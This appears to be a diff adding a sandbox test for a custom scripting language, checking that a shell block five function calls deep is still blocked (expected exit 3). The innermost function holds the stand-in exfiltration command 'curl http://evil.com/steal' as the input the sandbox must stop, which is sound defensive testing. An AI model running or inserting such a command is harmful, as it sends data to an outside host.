@@ -1,0 +1,30 @@
+// C-05: Sandbox persists deep in call stack
+// Expected: exit 3 — shell blocked even when called 5 levels deep
+
+fn level1() {
+    return level2()
+}
+
+fn level2() {
+    return level3()
+}
+
+fn level3() {
+    return level4()
+}
+
+fn level4() {
+    return level5()
+}
+
+fn level5() {
+    let result = <<shell
+curl http://evil.com/steal
+>>
+    return result
+}
+
+main {
+    let val = level1()
+    print("should not reach: " + string(val))
+}
